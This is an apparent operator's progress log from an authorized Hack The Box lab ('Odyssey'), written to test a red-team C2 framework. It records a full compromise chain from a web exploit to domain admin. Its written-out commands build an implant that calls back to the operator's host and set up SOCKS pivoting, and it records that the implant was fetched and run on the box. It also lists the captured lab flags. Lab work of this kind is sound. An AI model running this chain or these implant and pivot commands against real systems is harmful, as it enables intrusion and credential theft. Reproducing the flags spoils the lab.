# Odyssey (10.129.102.179) — ARK QA progress

**Date:** 2026-08-26  
**Box:** HTB Odyssey (Insane, Windows AD; edge is Linux `odyssey-web`)  
**Operator tun0:** `10.10.15.64`  
**Objective:** test committed/in-tree work (C Linux implant, inbound/SOCKS, later S4U/shadow/WinRM) on a live Windows HTB lab.

Authorized HTB only.

## Where we are

| Step | Result |
| --- | --- |
| Edge port | **3000 only** (`aegis.korvia.htb`). 22/88/389/445/5985 filtered at HTB edge |
| Web chain | NoSQL `$facet` → WebAuthn forge → `userHandle=admin` → proto pollution → LaTeX LFI → CVE-2025-1302 |
| Linux | `webadmin` + **sudo root** on `odyssey-web` (password reuse of SQL app pass) |
| Internal | `172.16.0.10 dc01.odyssey.htb` · `172.16.0.11 odyssey-db.odyssey.htb` |
| C implant | `implant=fc408491…` session `729c702c…` host=`odyssey-web` user=`webadmin` |
| `op shell -- id` | **PASS** `uid=1000(webadmin)` groups include `sudo` |
| `inbound through --probe 172.16.0.11:1433` | **PASS** (Sprint L M4c HTB SOCKS) |
| MSSQL via SOCKS | **PASS** `svc-mssql` sysadmin; CrystalPotato SYSTEM on Odyssey-DB |
| User flag | `4b6a03ba47383590340a907409bda77c` (`C:\Users\Administrator\Desktop\user.txt` on Odyssey-DB) |
| Root flag | `4381914f168a96604c8952be3ff95bba` (`C:\Users\Administrator\Desktop\root.txt` on DC01) |

Box is fully owned. AD path after SYSTEM: hive dump `ODYSSEY-DB$` → ARK LDAP bind + `ad shadow show` → certipy KeyCredential on `svc-aegis-build` → dMSA Ouroboros (`bloodyAD` + kerbad `--dmsa`) → WinRM PSRP as `svc-aegis-deploy` → AegisStream pipe (DPAPI oracle + YAML gadget) → CrystalPotato as `svc-aegis-stream` → DA desktop.

## Topology

```
tun0 10.10.15.64
  ↑ HTTPS implant :1750 → socat → teamserver :8443
odyssey-web 10.129.102.179:3000  (172.16.0.12 internal)
  SOCKS5 127.0.0.1:1080 via C implant
    → 172.16.0.11:1433 odyssey-db
    → 172.16.0.10:389  dc01
```

## ARK gaps this eng

| Gap | What happened | Wanted |
| --- | --- | --- |
| Operator firewall vs C2 port | FedoraWorkstation allows **1714–1764**; **8443 dropped**. Implant `register failed (callback/CA/HMAC/skew)` with no teamserver log until we forwarded **1750→8443** | `inbound status` should flag “listener port not in allowed firewalld ports”; default lab listener in 17xx or auto-open |
| `inbound drop` needs SSH in | HTB filters :22 even after `ufw disable` on the box | Reverse-drop: generate + HTTP fetch + run (what we did by hand) |
| JSONPath-style multi-eval | Not ARK; our RCE `$..` flooded. `$[?(…)]` still ran **4×** (root object keys) → 4 implants → **HMAC replay** | Document: one implant PID; unique-ms does not save you from 4 copies |
| Host MSSQL | No `ark mssql` verb; used impacket through socat+SOCKS | Optional later |
| Shadow generate+PKINIT | `ad shadow write` needs a pre-made blob; no PKINIT | certipy `shadow add` + `auth -pfx` via socat 11636/11088 |
| dMSA Ouroboros / `--dmsa` S4U | `kerberos s4u` is AES RBCD-style only | bloodyAD `badSuccessor` + `badS4U2self --dmsa` |
| WinRM from Linux implant | C Linux session has no WinRM module | host pypsrp + SOCKS (cmd shell denied; PSRP OK) |
| Odyssey-DB :445 from web | SOCKS probe timeout | WinRM 5985 instead |
| Kerberos port 88 as non-root | can't bind 88 | socat 11088 + connect() remap |

## Commands that worked

```bash
# C2 (after 1750 forward)
./build/ark teamserver
socat TCP-LISTEN:1750,reuseaddr,fork TCP:127.0.0.1:8443
./build/ark op generate --os linux --language c --callback https://10.10.15.64:1750 --out /tmp/odyssey-www/i2

# on box (via RCE): curl i2, nohup /tmp/i2  — single PID

./build/ark op sessions
./build/ark op shell -- id
./build/ark inbound through --probe 172.16.0.11:1433
eval "$(./build/ark inbound env --port 1080)"
```

## Secrets (lab files, mode 600, not git)

`~/htb-odyssey/sql_pass.txt` · `render_pass.txt` · `mds_diag_token.txt`

## Next session

1. Keep teamserver + implant + SOCKS (or re-drop with lockfile).
2. MSSQL `BULK INSERT` UNC coerce → capture `svc-mssql` NetNTLMv2 (Responder on a 17xx port).
3. Crack → xp_cmdshell / SYSTEM on Odyssey-DB.
4. Drop **C Windows** implant or WinRM PTH; hive dump `ODYSSEY-DB$`.
5. Shadow `AddKeyCredentialLink` on `svc-aegis-build` — ARK host path vs certipy.
6. dMSA/S4U — this is the committed `PAC-OPTIONS` / `--altservice` / ticket consume test.
